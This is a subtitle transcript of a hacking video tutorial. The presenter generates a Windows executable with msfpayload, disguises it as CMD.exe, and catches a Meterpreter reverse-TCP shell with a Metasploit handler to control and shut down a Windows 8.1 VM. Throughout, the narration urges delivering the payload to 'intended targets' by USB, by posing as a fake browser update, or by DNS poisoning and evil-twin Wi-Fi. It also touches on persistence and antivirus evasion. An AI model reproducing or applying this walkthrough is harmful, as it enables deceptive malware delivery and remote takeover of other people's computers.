1
00:00:00,520 --> 00:00:02,628
Welcome back to this tutorial,

2
00:00:02,628 --> 00:00:07,011
let's just continue on from where
we stopped in the previous one.

3
00:00:07,011 --> 00:00:12,740
Let's just do this cuz we're gonna
need more than one terminal here.

4
00:00:12,740 --> 00:00:16,192
And let's put this one like this.

5
00:00:16,192 --> 00:00:19,250
I already have another root terminal open.

6
00:00:19,250 --> 00:00:21,800
Let's just put it here.

7
00:00:22,850 --> 00:00:23,491
Oh, come on.

8
00:00:26,751 --> 00:00:30,580
I don't know, I'm a perfectionist for
these things.

9
00:00:30,580 --> 00:00:31,470
Don't ask me why.

10
00:00:31,470 --> 00:00:40,571
I'll just put this one down, like this.

11
00:00:40,571 --> 00:00:44,191
Why, why are you doing this to me?

12
00:00:44,191 --> 00:00:46,492
Okay, there we go.

13
00:00:46,492 --> 00:00:51,870
So, now we have our setup where
you are gonna need two terminals.

14
00:00:51,870 --> 00:00:56,430
So just go ahead and
open them to root terminals.

15
00:00:57,660 --> 00:01:00,493
And down below I have
a small set of commands so

16
00:01:00,493 --> 00:01:03,410
I don't have to remember
them while I do this.

17
00:01:05,330 --> 00:01:09,544
Anyway, the first thing that
we're gonna use is, well,

18
00:01:09,544 --> 00:01:13,601
in my brilliant ordering of things,
the last one here.

19
00:01:13,601 --> 00:01:18,010
So just go ahead and
copy that, paste it here.

20
00:01:18,010 --> 00:01:21,550
And let me just go over this command so
we have msfpayload.

21
00:01:21,550 --> 00:01:24,010
You have specified which one you want.

22
00:01:24,010 --> 00:01:26,760
You have a listening host.

23
00:01:26,760 --> 00:01:28,870
This is your own IP address.

24
00:01:28,870 --> 00:01:32,543
And it's being redirected
to /root/Desktop, and

25
00:01:32,543 --> 00:01:37,284
then I have named it CMD.exe, but
you can name it whatever you want.

26
00:01:37,284 --> 00:01:41,570
You can smash your keyboard and
you can be anything.

27
00:01:41,570 --> 00:01:42,730
You can put your name,
last name, there if you want.

28
00:01:45,030 --> 00:01:48,182
Anyway, you would hit Enter here.

29
00:01:48,182 --> 00:01:52,408
I'm just gonna go ahead and change this
name because I've already generated it.

30
00:01:52,408 --> 00:01:55,280
Let's say CMD_01.

31
00:01:55,280 --> 00:02:00,941
Press Enter and
this is gonna run for a while.

32
00:02:00,941 --> 00:02:06,320
It's a virtual machine,
so give it a break.

33
00:02:06,320 --> 00:02:10,710
Understand that it does not possess
a significant amount of resources.

34
00:02:10,710 --> 00:02:14,231
And it says created by msfpayload, LHOST.

35
00:02:14,231 --> 00:02:17,114
And this is the path where
it's gonna be created, so

36
00:02:17,114 --> 00:02:19,611
we know that it's on
the desktop somewhere.

37
00:02:19,611 --> 00:02:20,362
Yup, there we go.

38
00:02:20,362 --> 00:02:23,777
So I have the old one but
I have the new one here.

39
00:02:23,777 --> 00:02:27,341
This is the CMD_01.exe.

40
00:02:28,730 --> 00:02:32,002
You can't actually run this
file on Linux without WINE.

41
00:02:32,002 --> 00:02:34,383
But we don't actually
want to run it on Linux.

42
00:02:34,383 --> 00:02:36,003
It doesn't make any difference.

43
00:02:36,003 --> 00:02:40,117
Now this file you can copy
on your USB drive and

44
00:02:40,117 --> 00:02:45,862
you can carry it around in order
to infect the intended target.

45
00:02:45,862 --> 00:02:50,602
Or you can actually force the download by,
I don't know,

46
00:02:50,602 --> 00:02:57,510
pretending as if it's an upgrade feature
for a web browser, something of a kind.

47
00:02:57,510 --> 00:03:00,780
Once you have the command of
your intended target's DNS,

48
00:03:00,780 --> 00:03:05,430
we can pretty much redirect them anywhere,
and do whatever you want.

49
00:03:06,430 --> 00:03:13,050
They can't do anything
unless you approve it.

50
00:03:13,050 --> 00:03:17,207
Once you have this you can
utilize it pretty much anywhere.

51
00:03:17,207 --> 00:03:17,949
Will it be detected or not?

52
00:03:17,949 --> 00:03:20,327
That is another issue indeed.

53
00:03:20,327 --> 00:03:24,455
Sometimes it will, sometimes it won't,
depending on the system and its upgrades.

54
00:03:24,455 --> 00:03:27,825
So this will work for Windows systems.

55
00:03:27,825 --> 00:03:31,525
I think it's gonna work universally
across pretty much all of them, but

56
00:03:31,525 --> 00:03:32,667
don't hold my word to it.

57
00:03:32,667 --> 00:03:35,036
I have tested it out on Windows 8.1.

58
00:03:35,036 --> 00:03:36,147
It does work there.

59
00:03:36,147 --> 00:03:38,547
Does it work on 7?

60
00:03:38,547 --> 00:03:39,577
Probably.

61
00:03:39,577 --> 00:03:41,169
Does it work on anything below 7?

62
00:03:41,169 --> 00:03:43,468
I don't know, but very likely.

63
00:03:43,468 --> 00:03:46,673
Like, 90% chance.

64
00:03:46,673 --> 00:03:49,717
Anyway, I'll just bring this back.

65
00:03:49,717 --> 00:03:52,212
So now that you have generated a payload,

66
00:03:52,212 --> 00:03:55,932
let us assume that we have
delivered it to the victim machine.

67
00:03:55,932 --> 00:04:01,332
As I said, just use the previous
tutorials and there you can combine any

68
00:04:01,332 --> 00:04:07,822
of those techniques to pretty much deliver
this to pretty much any machine out there.

69
00:04:07,822 --> 00:04:12,606
As long as you can either
redirect their traffic through

70
00:04:12,606 --> 00:04:17,591
you by creating an evil twin of a Wi-Fi or
by messing around

71
00:04:17,591 --> 00:04:22,730
with their DNS settings,
poisoning their traffic etc.

72
00:04:22,730 --> 00:04:24,474
Poisoning DR, etc.

73
00:04:24,474 --> 00:04:28,540
Anyway, I already have it copied out
onto my Windows 8.1 virtual machine, and

74
00:04:28,540 --> 00:04:33,260
I'm gonna go ahead and

75
00:04:33,260 --> 00:04:37,900
clear this screen cuz I don't think
we're going to be needing it anymore.

76
00:04:37,900 --> 00:04:40,103
Here I'm going to type in use.

77
00:04:40,103 --> 00:04:40,790
So tab option is supported here.

78
00:04:40,790 --> 00:04:45,610
You can finish your commands with tab.

79
00:04:46,950 --> 00:04:51,582
Multihandler, press Enter.

80
00:04:51,582 --> 00:04:57,092
And then you type in, well,
we can actually type in show options.

81
00:04:57,092 --> 00:05:01,771
This is gonna show you the options for
it, but not much here.

82
00:05:01,771 --> 00:05:05,621
You're clear, set payload.

83
00:05:05,621 --> 00:05:12,555
Nope, not like that.
Yes, actually, exactly like that,

84
00:05:12,555 --> 00:05:16,557
set payload windows.

85
00:05:16,557 --> 00:05:19,648
The tab can be a bit slow
in a virtual machine, but

86
00:05:19,648 --> 00:05:23,957
if you're using a physical machine,
this is gonna go a lot faster.

87
00:05:23,957 --> 00:05:32,057
meterpreter/reverse_tcp.

88
00:05:32,057 --> 00:05:36,080
So you remember all those payloads
that we've seen with search?

89
00:05:36,080 --> 00:05:38,079
Well, this is just one of them.

90
00:05:40,420 --> 00:05:42,119
Anyway, press Enter.

91
00:05:42,119 --> 00:05:43,339
Excellent.

92
00:05:43,339 --> 00:05:45,519
So payload is set.

93
00:05:45,519 --> 00:05:46,980
Now let us configure it.

94
00:05:46,980 --> 00:05:49,130
We can type in show options.

95
00:05:52,680 --> 00:05:53,341
There we go.

96
00:05:53,341 --> 00:05:56,601
So you have local host.

97
00:05:56,601 --> 00:05:57,682
This is what you need to configure.

98
00:05:57,682 --> 00:05:58,270
Listening host.

99
00:05:58,270 --> 00:06:01,091
And you can configure the listening port.

100
00:06:01,091 --> 00:06:02,650
The default is 4444.

101
00:06:04,120 --> 00:06:08,720
You can leave it, honestly, if you're
not using it for something else, but

102
00:06:08,720 --> 00:06:10,220
you can also change it.

103
00:06:10,220 --> 00:06:11,386
Here is how you would do it.

104
00:06:11,386 --> 00:06:16,878
So, set LHOST, wait, ifconfig,

105
00:06:16,878 --> 00:06:22,010
I want to see the IP address.

106
00:06:22,010 --> 00:06:28,844
So it's 102, clear, show options.

107
00:06:36,674 --> 00:06:39,960
I am, oh wow, my keyboard skills.

108
00:06:39,960 --> 00:06:40,860
Amazing, right?

109
00:06:41,980 --> 00:06:46,894
Anyway, now that we have this,
I just wanna keep the screen up there, so

110
00:06:46,894 --> 00:06:48,601
you can see the options.

111
00:06:48,601 --> 00:06:51,663
Just type in set, very simple.

112
00:06:51,663 --> 00:06:56,625
Plain English language,
which you want to set host to listen on.

113
00:06:56,625 --> 00:07:02,159
Set LHOST, LHOST, and that is going to

114
00:07:02,159 --> 00:07:07,201
be 192.168.1.102.

115
00:07:07,201 --> 00:07:11,463
This can also be your external IP address,
your public IP address, as I've said

116
00:07:11,463 --> 00:07:15,550
in the previous tutorial, you just need
to configure the DMZ on your router.

117
00:07:15,550 --> 00:07:20,420
That is different from one router to
the next, but it's just one option.

118
00:07:20,420 --> 00:07:23,301
You absolutely have to
have a DMZ in a router.

119
00:07:23,301 --> 00:07:24,080
It's always there.

120
00:07:24,080 --> 00:07:27,680
If you don't know how to do
it in your particular router,

121
00:07:27,680 --> 00:07:29,820
I mean, go log into it, look for it.

122
00:07:29,820 --> 00:07:33,770
If you really can't find it,
type in your model number in the net,

123
00:07:33,770 --> 00:07:37,010
and type in how to set the DMZ for
this model.

124
00:07:37,010 --> 00:07:41,360
You should be prompted with
a large supply of legit answers.

125
00:07:42,400 --> 00:07:44,510
Anyway, set listening host.

126
00:07:44,510 --> 00:07:45,782
Listening host set.

127
00:07:48,461 --> 00:07:52,779
Well, maybe not listening host, because it
says up there the listening address, but

128
00:07:52,779 --> 00:07:55,280
host needs to have an address.

129
00:07:55,280 --> 00:08:00,978
Anyway, same thing you would do for port,
if you wanted to change it, so set LPORT,

130
00:08:00,978 --> 00:08:05,850
set LPORT, and
then you would type in some number here.

131
00:08:05,850 --> 00:08:09,013
Which would reflect the port
that you wish to listen on.

132
00:08:09,013 --> 00:08:10,233
I'm just gonna leave the default.

133
00:08:10,233 --> 00:08:12,573
I don't really see any
reason to change it.

134
00:08:12,573 --> 00:08:17,721
Keep in mind that this port, that
the LPORT, needs to be the same as the.

135
00:08:20,701 --> 00:08:21,290
Actually, no.

136
00:08:21,290 --> 00:08:22,771
No, it doesn't need to be the same.

137
00:08:22,771 --> 00:08:26,011
You can just leave it like that,

138
00:08:26,011 --> 00:08:30,700
but also it can be set here,
doesn't matter.

139
00:08:30,700 --> 00:08:32,900
Yeah, you would actually be
able to set it here as well.

140
00:08:32,900 --> 00:08:35,580
If you set it here then it needs
to be the same as here, but

141
00:08:35,580 --> 00:08:37,732
if you didn't,
you can just leave it as it is.

142
00:08:37,732 --> 00:08:41,706
No problem,
no need to conduct any changes there.

143
00:08:41,706 --> 00:08:45,576
It depends how you use and
configure these commands,

144
00:08:45,576 --> 00:08:50,051
that you need some options or
don't need some options, etc.

145
00:08:50,051 --> 00:08:54,010
But I just decided to go at it this way,
so we've configured a host and

146
00:08:54,010 --> 00:08:56,420
I'm gonna go ahead and clear the screen.

147
00:08:59,240 --> 00:09:02,461
Show options.

148
00:09:02,461 --> 00:09:04,442
I want to confirm that I have set it.

149
00:09:04,442 --> 00:09:05,083
And there you go.

150
00:09:05,083 --> 00:09:06,264
So it says, LHOST.

151
00:09:06,264 --> 00:09:08,904
And then, there is an IP address.

152
00:09:08,904 --> 00:09:13,260
I prefer clearing up the screen, but if
you prefer to see the stuff that you have

153
00:09:13,260 --> 00:09:17,232
configured, and then run some commands,
feel free to do that as well.

154
00:09:17,232 --> 00:09:19,474
You don't need to clear
the screen as much as I do.

155
00:09:21,588 --> 00:09:27,100
Anyway, type in exploit, press Enter.

156
00:09:27,100 --> 00:09:35,910
It says started reverse handler on
192.168.1.102:, this is the port.

157
00:09:35,910 --> 00:09:38,290
And Starting the payload handler.

158
00:09:38,290 --> 00:09:40,630
Okay now where is my Windows machine?

159
00:09:41,860 --> 00:09:45,352
So now I'm here in my Windows machine and
this is the script.

160
00:09:45,352 --> 00:09:47,312
So cmd.exe.

161
00:09:49,492 --> 00:09:51,592
Basically, you can name
it whatever you want.

162
00:09:51,592 --> 00:09:54,190
You can present it as whatever you want.

163
00:09:54,190 --> 00:09:57,590
There are many other ones,
like DLLs, and stuff of a kind.

164
00:09:57,590 --> 00:09:59,920
You cannot see it with a search command.

165
00:09:59,920 --> 00:10:02,352
Feel free to explore further on that.

166
00:10:02,352 --> 00:10:05,309
And I do encourage you
to explore there and

167
00:10:05,309 --> 00:10:09,830
to discover many more options
that metasploit has to offer.

168
00:10:09,830 --> 00:10:13,680
Because if I was to make
a detailed overview of metasploit,

169
00:10:13,680 --> 00:10:17,145
I would probably need to
make like three courses, and

170
00:10:17,145 --> 00:10:20,623
I still wouldn't cover half
of the options in there.

171
00:10:20,623 --> 00:10:24,479
But anyway, try new things and

172
00:10:24,479 --> 00:10:30,413
ask whatever you feel
like in the discussions.

173
00:10:30,413 --> 00:10:34,971
I will be more than happy to help you
out with anything related to this.

174
00:10:34,971 --> 00:10:35,870
Doesn't necessarily need
to be in the tutorials.

175
00:10:35,870 --> 00:10:40,531
It can be something
outside of the tutorials.

176
00:10:40,531 --> 00:10:44,485
Regarding metasploit or something of
a kind, because it is a rather large

177
00:10:44,485 --> 00:10:47,900
framework, so if you need help with it,
just post it there.

178
00:10:47,900 --> 00:10:51,882
I will be glad to help you
out in any way that I can.

179
00:10:51,882 --> 00:10:54,130
Anyway, go ahead and start this, Run.

180
00:10:54,130 --> 00:10:59,439
This is a standard question that's
pretty much asked for any application.

181
00:11:01,230 --> 00:11:02,128
Do you want to run it?

182
00:11:02,128 --> 00:11:04,293
Go back to the Kali box.

183
00:11:04,293 --> 00:11:11,373
There you go, the meterpreter
session has actually started indeed.

184
00:11:11,373 --> 00:11:14,503
So what do we want to do here?

185
00:11:14,503 --> 00:11:17,133
Show uuid is that it?

186
00:11:17,133 --> 00:11:18,232
Nope.

187
00:11:18,232 --> 00:11:19,852
UUID.

188
00:11:19,852 --> 00:11:20,932
Is this the one?

189
00:11:23,232 --> 00:11:28,413
[SOUND] I'll put show.

190
00:11:28,413 --> 00:11:31,997
Oh well, it doesn't matter.

191
00:11:31,997 --> 00:11:36,280
When you enter the Meterpreter session,
things tend to change a little bit.

192
00:11:36,280 --> 00:11:37,250
But you can just type in shell.

193
00:11:39,820 --> 00:11:41,371
And there we go.

194
00:11:41,371 --> 00:11:46,073
So channel one created, Microsoft Windows,
Microsoft all rights received.

195
00:11:46,073 --> 00:11:50,954
What I wanted to show you
previous to this is the ID

196
00:11:50,954 --> 00:11:54,645
of the computer that we have seized,

197
00:11:54,645 --> 00:11:59,660
how it is marked, but
it doesn't really matter.

198
00:11:59,660 --> 00:12:02,420
It's a username,
I do believe it's a username.

199
00:12:02,420 --> 00:12:05,990
But it really doesn't matter,
as I said, you can just go in here and

200
00:12:05,990 --> 00:12:10,310
you can see that we are in
C:\Users\Creator\Desktop.

201
00:12:10,310 --> 00:12:16,490
And if I go, I can mk there.

202
00:12:16,490 --> 00:12:22,371
And let's see can you, nope.

203
00:12:22,371 --> 00:12:31,652
CAN_YOU_SEE_ME.

204
00:12:31,652 --> 00:12:32,411
Okay there.

205
00:12:32,411 --> 00:12:33,162
CAN_YOU_SEE_ME.

206
00:12:33,162 --> 00:12:35,543
Let's go back to our Windows machine.

207
00:12:37,939 --> 00:12:39,207
Where is it?

208
00:12:39,207 --> 00:12:39,807
Excellent.

209
00:12:39,807 --> 00:12:41,930
There it is.

210
00:12:41,930 --> 00:12:44,760
So there is a folder, in it,
it says, CAN_YOU_SEE_ME.

211
00:12:44,760 --> 00:12:45,520
Fantastic.

212
00:12:46,840 --> 00:12:48,590
Yeah, my music in the back.

213
00:12:50,260 --> 00:12:50,910
Where is it?

214
00:12:50,910 --> 00:12:51,905
Where is it?
Come on.

215
00:12:51,905 --> 00:12:53,960
Kali, there we go.

216
00:12:53,960 --> 00:12:58,650
So I'm guessing that the power off is not
going to work, but let's try it anyway.

217
00:13:00,840 --> 00:13:04,726
Power off is not recognized, so shutdown.

218
00:13:09,792 --> 00:13:13,490
Okay, so you see where the problem
is here that I have encountered?

219
00:13:14,490 --> 00:13:19,490
Immediately, you're using
one operating system and

220
00:13:19,490 --> 00:13:24,890
you've just been prompted with a command
line of another operating system.

221
00:13:26,560 --> 00:13:28,086
That can be problematic.

222
00:13:28,086 --> 00:13:29,146
Why?

223
00:13:29,146 --> 00:13:33,306
Because those two command lines
are completely different.

224
00:13:33,306 --> 00:13:37,458
Let's try reboot, no,

225
00:13:37,458 --> 00:13:41,620
it won't actually run.

226
00:13:41,620 --> 00:13:44,101
Let's try help, let's try help shutdown.

227
00:13:46,596 --> 00:13:50,450
And I get more options than I really
wanted here, but let's go, let's go.

228
00:13:52,180 --> 00:13:57,000
This is a simulated scenario and
we need to actually, it's clear?

229
00:13:57,000 --> 00:13:57,850
No, it's not.

230
00:13:57,850 --> 00:13:58,350
In Windows, it's cls.

231
00:14:00,780 --> 00:14:02,458
But it doesn't clear the current screen.

232
00:14:02,458 --> 00:14:04,710
[LAUGH] So that's kind of weird.

233
00:14:04,710 --> 00:14:10,140
So you see, Meterpreter shell is not
exactly what you expected it to be,

234
00:14:10,140 --> 00:14:13,230
but you still have a full
access to the machine

235
00:14:13,230 --> 00:14:15,360
that the current user has
that has ran the script.

236
00:14:16,370 --> 00:14:17,536
Now in addition to this,

237
00:14:17,536 --> 00:14:20,488
you can apply some other scripts
if you want to run them as well.

238
00:14:20,488 --> 00:14:23,390
You can run whatever you want.

239
00:14:23,390 --> 00:14:27,681
Just make a file, or something of a kind,
and do whatever you want.

240
00:14:27,681 --> 00:14:30,161
Let's go notepad.

241
00:14:33,321 --> 00:14:36,167
Again, my music.
Excellent, so

242
00:14:36,167 --> 00:14:40,440
we have notepad, that has started here,
which is rather interesting.

243
00:14:44,260 --> 00:14:50,140
And yeah,
this is not what you want at all.

244
00:14:50,140 --> 00:14:57,380
Let's see if another trick will work.

245
00:14:57,380 --> 00:15:00,430
Oh, okay, I can do this.

246
00:15:01,528 --> 00:15:03,596
Echo

247
00:15:03,596 --> 00:15:11,880
ANYBODY_THERE.

248
00:15:11,880 --> 00:15:17,266
Then I can reroute that to

249
00:15:17,266 --> 00:15:23,171
I don't know, bla.txt.

250
00:15:23,171 --> 00:15:30,582
Excellent, and
now I would need to type in notepad.

251
00:15:30,582 --> 00:15:32,118
The tab doesn't work here.

252
00:15:32,118 --> 00:15:36,758
Bla.txt, which is very annoying.

253
00:15:36,758 --> 00:15:42,550
And now you have successfully
started a blah.txt and excellent!

254
00:15:42,550 --> 00:15:47,600
There's another notepad file,
it says anybody there!

255
00:15:47,600 --> 00:15:52,100
So imagine, just kind of popping
here it says anybody there.

256
00:15:52,100 --> 00:15:57,290
Let's see if we can figure out how to shut

257
00:15:57,290 --> 00:16:02,950
the computer down with a shutdown command.

258
00:16:02,950 --> 00:16:09,010
There are so many options,
help, shut down, usage.

259
00:16:09,010 --> 00:16:11,010
There are a lot of arguments here.

260
00:16:11,010 --> 00:16:12,970
Display graphical user interface.

261
00:16:12,970 --> 00:16:14,910
No, I don't want that.

262
00:16:14,910 --> 00:16:22,906
Log off.

263
00:16:22,906 --> 00:16:27,026
Power failure environment, cord unplugged.

264
00:16:27,026 --> 00:16:28,786
I'm not sure if I want those.

265
00:16:28,786 --> 00:16:33,854
Let's see,

266
00:16:33,854 --> 00:16:39,846
shutdown /P.

267
00:16:39,846 --> 00:16:40,990
There we go.

268
00:16:40,990 --> 00:16:42,700
It actually worked.

269
00:16:42,700 --> 00:16:44,640
Meterpreter session 1 closed.

270
00:16:44,640 --> 00:16:45,830
Reason: Died.

271
00:16:47,240 --> 00:16:53,010
Basically, the computer on the other side,
as you can see in VirtualBox.

272
00:16:53,010 --> 00:16:55,950
I can't actually open it now.

273
00:16:55,950 --> 00:17:01,290
It's being bugged out because
it is actually stopping.

274
00:17:01,290 --> 00:17:02,660
So Kali, it says Windows 8.1.

275
00:17:02,660 --> 00:17:04,040
It says Powered Off.

276
00:17:05,260 --> 00:17:06,140
How amazing is that?

277
00:17:06,140 --> 00:17:08,120
You can just shut the computer down.

278
00:17:08,120 --> 00:17:13,530
But, there we go, so it's no longer there.

279
00:17:13,530 --> 00:17:16,790
So to tell you one thing, this would
be an extremely stupid thing to do.

280
00:17:16,790 --> 00:17:18,370
What I just did.

281
00:17:18,370 --> 00:17:22,418
Before I have made my strip persistent,

282
00:17:22,418 --> 00:17:27,070
before I have scheduled
it to run at boot time.

283
00:17:27,070 --> 00:17:30,370
I have shut down the computer
on the other side.

284
00:17:30,370 --> 00:17:31,791
What now?

285
00:17:31,791 --> 00:17:32,690
Nothing.

286
00:17:32,690 --> 00:17:33,380
You have to redo the process again.

287
00:17:33,380 --> 00:17:40,440
You have to hack back in or
wait until somebody's a genius.

288
00:17:40,440 --> 00:17:45,441
A genius on the other side actually
decides to click on that file for

289
00:17:45,441 --> 00:17:47,240
no reason whatsoever.

290
00:17:47,240 --> 00:17:49,401
And you generally wouldn't
put that on desktop.

291
00:17:49,401 --> 00:17:54,750
I just put it there as an example,
but you can put it anywhere you like.

292
00:17:54,750 --> 00:17:55,270
It doesn't matter.

293
00:17:55,270 --> 00:17:59,790
If they download it from the net,
it's gonna go into their Downloads folder.

294
00:17:59,790 --> 00:18:03,710
But it doesn't matter, as long as
they run it, it's gonna be fantastic.

295
00:18:03,710 --> 00:18:06,802
And once again,
you do have a way of deploying this,

296
00:18:06,802 --> 00:18:12,140
because you do have a way of directing
the traffic of your intended target.

297
00:18:12,140 --> 00:18:16,740
Anyway, I bid you farewell,
and I hope to see you in

298
00:18:16,740 --> 00:18:22,330
the follow up tutorial where we
shall expand upon this further.
